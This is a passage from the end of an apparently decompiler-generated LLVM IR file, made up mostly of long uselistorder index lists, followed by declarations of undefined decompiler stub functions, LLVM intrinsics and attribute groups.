107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 64, 131, 65, 62, 63, 66, 132, 135, 136, 137, 138, 139, 140, 133, 134, 51, 141, 142, 143, 144, 145, 69, 147, 148, 52, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 171, 172, 173, 174, 175, 176, 177, 12, 178, 179, 180, 181, 182, 183, 184, 206, 207, 7, 185, 186, 187, 188, 191, 192, 195, 196, 197, 198, 199, 200, 201, 208, 220, 234, 57, 50 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 39, 75, 76, 77, 85, 86, 87, 40, 41, 42, 0, 36, 37, 38, 43, 47, 48, 44, 45, 46, 92, 30, 31, 32, 33, 34, 35, 59, 60 }
  uselistorder i32 0, { 509, 508, 572, 573, 1773, 513, 512, 574, 1774, 1775, 1776, 1777, 461, 460, 575, 1778, 1779, 209, 1780, 1782, 1783, 151, 152, 1784, 1785, 1781, 95, 96, 97, 98, 2, 1, 3, 0, 198, 197, 199, 200, 201, 1786, 510, 511, 142, 137, 1787, 1788, 203, 204, 202, 205, 1789, 1790, 1791, 1792, 208, 207, 206, 1793, 1794, 1795, 500, 499, 576, 514, 577, 515, 578, 516, 579, 580, 581, 153, 1796, 530, 529, 1797, 1798, 528, 527, 1799, 582, 525, 526, 523, 524, 522, 521, 1800, 520, 519, 518, 517, 470, 1801, 1817, 1802, 212, 1803, 1804, 1805, 1806, 1807, 1808, 214, 1810, 1811, 210, 211, 1812, 1813, 128, 154, 1814, 1815, 763, 99, 100, 501, 502, 213, 1809, 1816, 469, 1818, 583, 584, 1819, 532, 531, 215, 1820, 1821, 216, 1822, 1823, 1824, 111, 585, 586, 1825, 217, 1826, 155, 1827, 1828, 218, 1829, 1830, 1831, 1832, 1833, 1834, 1835, 1836, 1837, 1838, 38, 129, 587, 1839, 219, 1840, 1841, 1842, 4, 1843, 1844, 5, 1845, 1846, 974, 975, 6, 143, 1847, 588, 1848, 888, 889, 890, 891, 892, 896, 893, 894, 895, 7, 471, 101, 897, 589, 898, 899, 900, 533, 534, 976, 977, 8, 590, 833, 591, 1849, 1850, 1851, 9, 10, 156, 157, 158, 1866, 1867, 11, 834, 159, 160, 1683, 1684, 1685, 1686, 220, 221, 1687, 843, 222, 130, 48, 1868, 102, 472, 1872, 1873, 49, 901, 112, 902, 903, 904, 473, 161, 1869, 1870, 1871, 474, 12, 1874, 1875, 1876, 1877, 1878, 1881, 1882, 1883, 1884, 1885, 1886, 1887, 1888, 1889, 1890, 1879, 1880, 1891, 1892, 1893, 1894, 1895, 1896, 1897, 1898, 39, 1899, 1900, 1901, 1902, 1903, 40, 1904, 1905, 1906, 41, 1907, 1908, 1909, 42, 1910, 1911, 1912, 1913, 1914, 1915, 1916, 1917, 1918, 1919, 1920, 1921, 1922, 1923, 1924, 1925, 1926, 1927, 1928, 1929, 1930, 1931, 1932, 1933, 1936, 1937, 1938, 1939, 1940, 1941, 1942, 1934, 1935, 1943, 1944, 1945, 1946, 1947, 1948, 1949, 1950, 1951, 1952, 43, 1953, 1954, 1955, 1956, 1957, 44, 1958, 1959, 1960, 1961, 1962, 45, 1963, 1964, 1965, 1966, 1967, 1968, 1969, 1970, 1971, 1972, 1973, 1974, 1975, 1976, 1977, 223, 905, 764, 906, 907, 908, 909, 943, 592, 593, 944, 945, 162, 163, 164, 227, 910, 225, 911, 932, 925, 765, 926, 927, 928, 929, 50, 51, 115, 930, 931, 475, 933, 934, 766, 935, 224, 936, 52, 53, 114, 937, 938, 767, 939, 940, 54, 55, 113, 941, 226, 942, 165, 912, 768, 913, 914, 594, 915, 916, 769, 917, 918, 921, 919, 920, 476, 922, 56, 57, 117, 923, 770, 58, 59, 116, 924, 946, 771, 947, 948, 949, 950, 951, 952, 772, 953, 954, 955, 956, 836, 835, 479, 838, 839, 837, 477, 478, 840, 841, 595, 842, 844, 845, 773, 846, 847, 848, 774, 849, 850, 60, 61, 118, 851, 852, 853, 103, 104, 854, 855, 856, 228, 857, 858, 859, 860, 861, 596, 862, 863, 864, 865, 866, 867, 166, 870, 775, 871, 872, 62, 63, 120, 873, 874, 875, 776, 876, 877, 878, 879, 777, 880, 881, 64, 65, 119, 882, 883, 884, 885, 886, 229, 231, 868, 230, 869, 232, 887, 167, 957, 962, 963, 958, 959, 960, 965, 966, 967, 233, 968, 969, 970, 971, 972, 961, 964, 973, 168, 978, 979, 980, 597, 1422, 598, 981, 1852, 1853, 1854, 234, 1855, 1748, 1747, 1691, 1664, 1530, 983, 982, 984, 1423, 1424, 1425, 1978, 1979, 1980, 1981, 235, 1982, 1983, 1984, 1692, 1693, 497, 498, 599, 1989, 781, 1990, 600, 1991, 1992, 601, 1993, 1994, 779, 236, 481, 1995, 780, 1996, 602, 105, 1997, 1998, 603, 2013, 2014, 2017, 778, 480, 2018, 535, 170, 169, 2015, 2016, 1985, 1986, 782, 237, 462, 824, 13, 14, 2009, 1554, 147, 988, 2008, 1631, 1749, 138, 1750, 783, 238, 1751, 1752, 1999, 2000, 2001, 2002, 604, 2003, 171, 1388, 1389, 66, 67, 121, 1753, 1754, 110, 483, 1758, 1755, 1756, 784, 1757, 1759, 785, 1760, 1761, 1762, 1763, 68, 69, 122, 1764, 239, 1765, 1766, 1767, 1769, 1768, 482, 825, 827, 826, 240, 828, 829, 830, 605, 831, 172, 1987, 1988, 1390, 1391, 1392, 1393, 1394, 1395, 242, 173, 1396, 1397, 1398, 139, 241, 1399, 174, 607, 608, 2004, 606, 175, 176, 1699, 1700, 1701, 1702, 1703, 243, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 244, 1694, 609, 1695, 1696, 610, 1697, 1698, 177, 786, 245, 246, 1665, 611, 247, 1666, 1667, 1668, 1669, 1670, 178, 248, 251, 250, 257, 256, 255, 253, 254, 249, 252, 1711, 1712, 1736, 1737, 179, 1713, 1714, 261, 259, 260, 1715, 1716, 267, 266, 194, 258, 1717, 1718, 1719, 1720, 1721, 1722, 504, 503, 536, 612, 1723, 1724, 1725, 106, 1726, 263, 262, 264, 265, 193, 1727, 1728, 484, 1729, 1730, 148, 1731, 1732, 1733, 1734, 1735, 15, 16, 989, 990, 107, 17, 537, 613, 180, 1654, 1632, 1634, 1633, 1656, 1655, 1532, 1531, 992, 991, 1400, 993, 994, 1658, 1657, 1659, 1688, 2019, 2020, 123, 181, 1426, 1427, 1428, 268, 985, 986, 269, 1429, 1434, 1435, 1436, 1437, 270, 1430, 271, 1431, 1432, 1438, 1401, 614, 1533, 2005, 2006, 2007, 995, 997, 996, 1439, 998, 1770, 999, 1000, 1001, 2010, 2011, 2012, 1433, 18, 1856, 1857, 1858, 144, 1859, 1860, 1861, 1862, 1863, 272, 1864, 787, 790, 788, 789, 1865, 791, 195, 273, 1440, 1441, 140, 494, 1442, 1443, 792, 19, 485, 274, 275, 276, 70, 277, 615, 1002, 1444, 1445, 1446, 1673, 1672, 1674, 1675, 1676, 1677, 46, 278, 1678, 1679, 1680, 279, 131, 132, 570, 571, 987, 281, 280, 282, 1447, 283, 1448, 1449, 284, 1738, 1739, 616, 285, 1450, 286, 287, 1585, 288, 1555, 1010, 1003, 289, 290, 817, 818, 820, 1004, 308, 1005, 1006, 795, 805, 806, 807, 796, 808, 809, 797, 810, 819, 811, 133, 71, 465, 466, 812, 798, 813, 799, 814, 800, 815, 801, 816, 821, 822, 617, 823, 1007, 793, 1008, 618, 1009, 487, 486, 1011, 1012, 1013, 1014, 310, 309, 1015, 1016, 1017, 802, 463, 1018, 124, 125, 464, 1019, 126, 127, 619, 1020, 1021, 1023, 1024, 794, 1025, 1026, 1027, 1028, 1029, 620, 1030, 1031, 94, 145, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 311, 1040, 1041, 1042, 1043, 1044, 312, 1045, 1046, 1047, 1048, 1049, 1050, 313, 1051, 1052, 314, 1053, 1054, 315, 1055, 1056, 1057, 72, 1058, 1059, 1060, 1061, 316, 1062, 1063, 1064, 317, 1065, 182, 183, 1066, 1067, 1068, 318, 1069, 1070, 1071, 1072, 319, 1073, 1074, 1075, 1076, 291, 1077, 1078, 1079, 320, 1080, 1081, 1082, 1083, 321, 1084, 1085, 1086, 1087, 1088, 322, 1089, 1090, 1091, 1092, 323, 1093, 1094, 1095, 1096, 324, 1097, 1098, 1099, 1100, 325, 1101, 1102, 1103, 1104, 326, 1105, 1106, 1107, 1108, 1109, 327, 1110, 1111, 1112, 1113, 328, 1114, 1115, 1116, 1117, 329, 1118, 1119, 1120, 1121, 330, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 292, 1139, 1140, 1141, 1142, 331, 1143, 1144, 1145, 1146, 332, 1147, 293, 333, 1148, 1149, 334, 1150, 294, 335, 1151, 1152, 336, 1153, 184, 185, 1154, 1155, 1156, 337, 1157, 1158, 1159, 1160, 338, 1161, 1162, 1163, 1164, 339, 1165, 1166, 1167, 1168, 295, 1169, 1170, 1171, 1172, 296, 1173, 1174, 1175, 1176, 340, 1177, 1178, 1179, 1180, 1181, 341, 1182, 1183, 1184, 1185, 297, 1186, 1187, 1188, 1189, 342, 1190, 1191, 1192, 1193, 343, 1194, 1195, 1196, 298, 1197, 1198, 1199, 1200, 344, 1201, 1202, 1203, 1204, 299, 1205, 1206, 1207, 300, 1208, 1209, 1210, 1211, 345, 1212, 1213, 1214, 1215, 301, 1216, 1217, 1218, 1219, 346, 1220, 1221, 1222, 1223, 347, 1224, 1225, 1226, 1227, 348, 1228, 302, 349, 1229, 1230, 303, 1231, 1232, 1233, 1234, 350, 1235, 1236, 1237, 1238, 351, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 304, 1246, 1247, 1248, 305, 1249, 1250, 1251, 1252, 352, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 353, 1268, 1269, 1270, 1271, 354, 1272, 1273, 355, 1274, 1275, 356, 1276, 1277, 1278, 357, 1279, 1280, 1281, 358, 1282, 1283, 1284, 359, 1285, 1286, 360, 1287, 1288, 1289, 361, 1290, 1291, 362, 1292, 1293, 363, 1294, 1295, 1296, 1297, 364, 1298, 1299, 365, 1300, 1301, 366, 1302, 1303, 367, 1304, 1305, 368, 1306, 1307, 369, 1308, 1309, 1310, 370, 1311, 306, 371, 1312, 1313, 1314, 372, 1315, 150, 186, 1316, 1317, 307, 1318, 1319, 373, 1320, 1321, 374, 1322, 1323, 1324, 1325, 375, 1326, 1327, 1328, 1329, 376, 1330, 1331, 1332, 1333, 377, 1334, 1335, 378, 1336, 1337, 379, 1338, 1339, 1340, 1341, 380, 1342, 381, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 621, 622, 1368, 623, 1369, 1372, 1373, 382, 1370, 383, 1371, 384, 1022, 1556, 1557, 1374, 385, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 468, 467, 1382, 624, 1383, 625, 1384, 626, 1385, 505, 1386, 627, 1387, 1402, 1403, 1404, 390, 389, 803, 187, 804, 388, 387, 386, 489, 495, 628, 1405, 391, 392, 1413, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 488, 629, 1414, 630, 1415, 631, 1416, 632, 1417, 1418, 1419, 1420, 73, 1421, 393, 633, 141, 1451, 1452, 1453, 1454, 492, 1455, 1456, 1457, 491, 1458, 1459, 1460, 1461, 394, 1462, 1464, 1463, 188, 189, 395, 490, 397, 396, 1465, 398, 399, 108, 400, 1466, 403, 1467, 1468, 1469, 1470, 402, 401, 404, 1471, 1472, 74, 75, 190, 1473, 1474, 20, 21, 22, 23, 1475, 1476, 405, 539, 1477, 634, 1478, 635, 1479, 636, 1480, 637, 1481, 638, 1482, 639, 1483, 538, 1484, 409, 1486, 1487, 1488, 1489, 407, 406, 410, 1490, 1491, 76, 77, 1485, 408, 1493, 1492, 24, 25, 26, 27, 1494, 411, 1495, 1496, 541, 1497, 640, 1498, 641, 1499, 642, 1500, 643, 1501, 644, 1502, 645, 1503, 540, 1504, 646, 1505, 415, 1507, 1508, 1509, 1510, 413, 412, 416, 1511, 1512, 78, 79, 1506, 414, 1513, 80, 647, 1514, 1516, 1517, 1518, 1519, 648, 1520, 28, 29, 30, 31, 32, 1515, 417, 1521, 1522, 547, 1523, 546, 1524, 545, 1525, 544, 1526, 542, 1527, 543, 1528, 649, 1529, 421, 1535, 1536, 1537, 1538, 419, 418, 422, 1539, 1540, 81, 82, 1534, 420, 1541, 83, 650, 1542, 1544, 1545, 1546, 1547, 651, 1548, 33, 34, 35, 36, 37, 1543, 423, 1549, 1550, 549, 1551, 548, 1552, 652, 1553, 426, 1558, 1559, 1560, 1561, 425, 424, 427, 1562, 1563, 84, 85, 196, 146, 428, 109, 654, 1564, 1565, 1566, 1567, 1568, 429, 1569, 1570, 552, 1571, 1572, 1573, 1574, 433, 430, 431, 432, 1575, 1576, 1577, 1578, 655, 1579, 1580, 551, 1581, 653, 1582, 550, 1583, 656, 1584, 435, 1586, 1587, 1588, 1589, 434, 436, 1590, 1591, 86, 87, 134, 1592, 437, 1593, 1594, 555, 1595, 553, 1596, 554, 1597, 1600, 1601, 1602, 439, 440, 1603, 1604, 88, 1598, 1599, 438, 1606, 1605, 1607, 441, 1608, 1609, 558, 1610, 557, 1611, 556, 1612, 657, 1613, 1615, 1616, 1617, 443, 444, 445, 1619, 1620, 89, 1618, 1614, 442, 1622, 1623, 1621, 1624, 446, 1625, 1626, 561, 1627, 560, 1628, 559, 1629, 658, 1630, 450, 1636, 1637, 1638, 1639, 449, 448, 451, 1640, 1641, 90, 91, 1635, 447, 1642, 1643, 452, 1644, 1645, 564, 1646, 563, 1647, 562, 1648, 659, 1649, 661, 135, 92, 1650, 191, 565, 662, 663, 1651, 1652, 453, 454, 1653, 660, 665, 136, 93, 1660, 192, 566, 666, 1661, 1662, 455, 456, 1663, 664, 506, 1671, 1681, 457, 1682, 1689, 458, 1690, 1740, 149, 1741, 1742, 507, 667, 493, 1743, 1744, 47, 496, 1745, 1746, 668, 1771, 459, 1772, 2021, 567, 832, 568, 569, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 2022, 2023, 2024, 2025, 2026, 2027, 2028, 2029, 2030, 2031, 2032, 2033, 2034, 2035, 2036 }
  uselistorder i32* @r4, { 90, 817, 818, 819, 820, 821, 839, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 10, 836, 837, 838, 840, 841, 842, 843, 844, 845, 846, 847, 97, 98, 99, 100, 143, 11, 144, 145, 146, 12, 147, 148, 149, 150, 151, 152, 153, 0, 13, 154, 155, 156, 157, 158, 159, 160, 161, 220, 221, 848, 91, 92, 93, 850, 851, 852, 5, 855, 57, 849, 736, 737, 101, 102, 103, 104, 105, 106, 107, 108, 109, 856, 857, 162, 163, 14, 4, 164, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 15, 165, 166, 167, 168, 169, 170, 171, 172, 191, 16, 192, 193, 173, 174, 176, 17, 177, 180, 18, 181, 182, 19, 183, 184, 20, 185, 186, 21, 187, 188, 22, 189, 54, 190, 175, 194, 23, 195, 196, 197, 198, 199, 200, 201, 178, 179, 94, 95, 96, 110, 111, 112, 113, 24, 114, 25, 26, 115, 116, 117, 118, 119, 120, 121, 126, 127, 27, 128, 129, 28, 130, 131, 29, 132, 133, 30, 134, 135, 31, 136, 137, 32, 138, 139, 122, 123, 124, 125, 140, 141, 142, 202, 203, 204, 33, 205, 206, 207, 34, 208, 209, 210, 211, 212, 213, 52, 214, 215, 216, 217, 218, 219, 222, 223, 224, 225, 341, 226, 853, 854, 799, 800, 801, 802, 803, 804, 700, 701, 342, 343, 874, 875, 876, 741, 742, 56, 880, 53, 881, 882, 883, 899, 901, 902, 903, 900, 884, 889, 897, 898, 877, 890, 891, 892, 893, 58, 805, 806, 6, 35, 807, 36, 808, 809, 810, 885, 886, 811, 82, 83, 84, 85, 86, 87, 878, 879, 887, 888, 227, 228, 229, 230, 743, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 37, 759, 760, 761, 762, 744, 745, 746, 702, 703, 704, 705, 706, 707, 708, 709, 710, 38, 711, 712, 713, 714, 715, 716, 717, 718, 719, 763, 785, 786, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 55, 777, 778, 1, 779, 780, 781, 782, 783, 784, 234, 235, 236, 635, 636, 637, 638, 639, 642, 643, 644, 640, 641, 674, 675, 676, 677, 678, 679, 680, 488, 489, 490, 493, 494, 495, 491, 492, 237, 238, 239, 240, 241, 242, 243, 244, 245, 59, 681, 682, 683, 684, 685, 686, 687, 344, 345, 346, 347, 348, 349, 350, 231, 232, 233, 351, 352, 353, 354, 9, 355, 356, 357, 358, 359, 360, 361, 246, 247, 248, 251, 252, 253, 249, 250, 254, 255, 256, 257, 258, 259, 894, 895, 896, 260, 261, 262, 362, 363, 364, 365, 366, 263, 578, 579, 537, 538, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 264, 265, 266, 267, 62, 63, 60, 61, 64, 65, 66, 67, 68, 69, 70, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 287, 288, 289, 296, 297, 298, 299, 300, 301, 7, 302, 290, 291, 292, 293, 294, 295, 283, 284, 285, 286, 688, 689, 539, 540, 541, 542, 543, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 88, 322, 39, 40, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 367, 368, 8, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 41, 385, 42, 386, 43, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 44, 411, 45, 412, 46, 413, 47, 414, 415, 416, 417, 48, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 49, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 50, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 645, 646, 51, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 2, 667, 668, 669, 670, 671, 672, 673, 690, 691, 692, 3, 693, 694, 695, 696, 697, 698, 699, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 738, 739, 740, 787, 788, 791, 789, 790, 792, 793, 794, 795, 796, 797, 798, 812, 813, 814, 815, 89, 816 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
